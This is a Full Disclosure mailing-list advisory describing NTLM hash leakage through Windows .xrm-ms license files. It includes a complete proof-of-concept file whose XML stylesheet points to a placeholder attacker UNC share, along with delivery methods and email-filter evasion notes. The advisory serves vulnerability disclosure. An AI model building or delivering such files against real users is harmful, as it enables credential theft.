---
title: Microsoft Windows .XRM-MS File / NTLM Information Disclosure	Spoofing
url: https://seclists.org/fulldisclosure/2025/May/0
source: Full Disclosure
date: 2025-05-02
fetch_date: 2025-10-06T22:33:24.398172
---

# Microsoft Windows .XRM-MS File / NTLM Information Disclosure	Spoofing

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

![Previous](/images/left-icon-16x16.png)
[By Date](date.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![Previous](/images/left-icon-16x16.png)
[By Thread](index.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![](/shared/images/nst-icons.svg#search)

# Microsoft Windows .XRM-MS File / NTLM Information Disclosure Spoofing

---

*From*: hyp3rlinx <apparitionsec () gmail com>
*Date*: Wed, 30 Apr 2025 21:27:11 -0400

---

```
[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source:  https://hyp3rlinx.altervista.org/advisories/Microsoft_Windows_xrm-ms_File_NTLM-Hash_Disclosure.txt
[+] x.com/hyp3rlinx
[+] ISR: ApparitionSec

[Vendor]
www.microsoft.com

[Product]
.xrm-ms File Type

[Vulnerability Type]
NTLM Hash Disclosure (Spoofing)

[Video URL PoC]
https://www.youtube.com/watch?v=d5U_krLQbNY

[CVE Reference]
N/A

[Security Issue]
The Windows XRM-MS file type is related to Microsofts software
licensing infrastructure.
C:\> assoc .xrm-ms=MSSppLicenseFile.

An "xrm-ms" digital license file opens default (times a tickin) in
Internet Explorer (MSIE) and on later OS versions switches to MS Edge.
The ".xrm-ms" file format allows injecting XML stylesheets that will
then get processed, when a user opens it. Adversaries can reference
UNC paths for the stylesheet HREF tag that points to LAN network share
or attacker controlled infrastructure.

This results in an outbound connection to the attacker controlled
network share and or server, leaking the target NTLM hash. Works from
both a LAN network share perspective or remote forced drive-by
download to a target etc. User interaction is required to open the
file.

During testing, xrm-ms file type not blocked by Windows Office Outlook
client 2016 and a popular Email Gateway Security product as of few
days ago.

Xrm-Ms File points:

1) XRM-MS is not considered dangerous file type
2) Defaults to open in either MSIE or Edge Win7/10/11/Server 2019
3) Default Icon as it is Windows browser may make it appear more "trust-worthy"
4) Throws no errors from the stylesheet directive when processed
5) May bypass some inbound email security inspections
6) No MOTW roadblocks
7) No active content security warnings

Tested successfully in Win7/Win10/Server 2019
Mileage may vary on Windows 11 and or recently updated systems.

[Exploit/POC]

Delivery options:
Drive-by force download
Email
Network Share
Archive .zip etc

1) Create .xrm-ms File with following content, adjust attacker server
information. Actually, all you need is the one XML stylesheet to
trigger it.

<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet href="\\ATTACKER-SERVER\NTLMhashLeakDontMeetMSRCBarPoC" ?>
<r:license xmlns:r="http://www.microsoft.com/DRM/rightsManager";>
  <r:licenseID>12345-67890-ABCDE</r:licenseID>
  <r:productName>Windows(R) Operating System, VOLUME_KMSCLIENT
channel</r:productName>
  <r:productKeyID>XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</r:productKeyID>
  <r:hardwareBinding>
    <r:hash>AA11BB22CC33DD44EE55</r:hash>
  </r:hardwareBinding>
  <r:validity>
    <r:validFrom>2024-01-01T00:00:00</r:validFrom>
    <r:validUntil>2025-01-01T00:00:00</r:validUntil>
  </r:validity>
  <r:signature>...</r:signature>
</r:license>

[Network Access]
Remote

[Severity]
Medium

[Disclosure Timeline]
Vendor Notification:  April 17, 2025
MSRC response: "report is a moderate spoofing and doesn't meet the
bar." April 29, 2025
April 30, 2025 : Public Disclosure

[+] Disclaimer
The information contained within this advisory is supplied "as-is"
with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion
in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse
of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The
author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content copyright (c).

hyp3rlinx
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

![Previous](/images/left-icon-16x16.png)
[By Date](date.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![Previous](/images/left-icon-16x16.png)
[By Thread](index.html#0)
[![Next](/images/right-icon-16x16.png)](1)

### Current thread:

* **Microsoft Windows .XRM-MS File / NTLM Information Disclosure Spoofing** *hyp3rlinx (May 01)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")